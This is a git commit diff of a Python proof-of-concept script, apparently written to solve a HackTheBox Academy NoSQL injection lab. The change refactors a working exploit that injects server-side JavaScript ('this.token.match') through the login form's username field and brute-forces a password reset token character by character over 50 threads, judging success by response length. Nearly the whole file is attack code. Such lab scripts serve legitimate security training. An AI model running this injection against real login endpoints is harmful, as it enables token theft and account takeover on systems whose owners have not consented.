5bd4efec14720937cb55d2647637e4eb0054bb81
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-05-15 08:55:59 -0400

    Update Mangofile.py

--- HTBAcademy: POC-Scripts/Mangofile.py
+++ HTBAcademy: POC-Scripts/Mangofile.py
@@ -2,24 +2,33 @@
 # This script exploits a server side javascript injection on a NoSQL database to get the password reset token.  
 # Wrote this to solve the lab on HackTheBox Academy - NoSQL Injection - Skills Assessment II
 #!/usr/bin/env python3
+#!/usr/bin/env python3
 
 import requests
 import string
 import concurrent.futures
 import time
 
+url = "http://83.136.251.226:38620/login"
+proxies = {"http": "http://127.0.0.1:8080"}
+headers = {"Content-type": "application/x-www-form-urlencoded"}
+list= string.ascii_uppercase + string.digits + '-'
+
+def test_char(secret, char):
+    data = {
+        "username": f'''"||this.token.match('^{secret}{char}.*')||"''',
+        "password": "test"
+    }
+    response = requests.post(url=url, proxies=proxies, headers=headers, data=data)
+    return len(response.text) == 2191
+
 def nosqli():
     secret = ''
-    finished = False
-    url = "http://83.136.251.226:38620/login"
-    proxies = {"http": "http://127.0.0.1:8080"}
-    headers = {"Content-type": "application/x-www-form-urlencoded"}
-
+    finished = False    
     while finished == False:
-        found_char = None
-        list= string.ascii_uppercase + string.digits + '-'
+        found_char = None      
         with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
-            future_to_char = {executor.submit(test_char, secret, char, url, proxies, headers): char for char in list}
+            future_to_char = {executor.submit(test_char, secret, char): char for char in list}
             for future in concurrent.futures.as_completed(future_to_char):
                 char = future_to_char[future]
                 if future.result():
@@ -32,18 +41,10 @@ def nosqli():
         else:
             finished = True
 
-def test_char(secret, char, url, proxies, headers):
-    data = {
-        "username": f'''"||this.token.match('^{secret}{char}.*')||"''',
-        "password": "test"
-    }
-    response = requests.post(url=url, proxies=proxies, headers=headers, data=data)
-    return len(response.text) == 2191
-
 try:    
     st= time.time()
     nosqli()    
     et= time.time()
-    print(f"This took {et - st} seconds")
+    print(f"This took {et - st}")
 except KeyboardInterrupt:
     print("ctrl + c detected, exiting gracefully...")
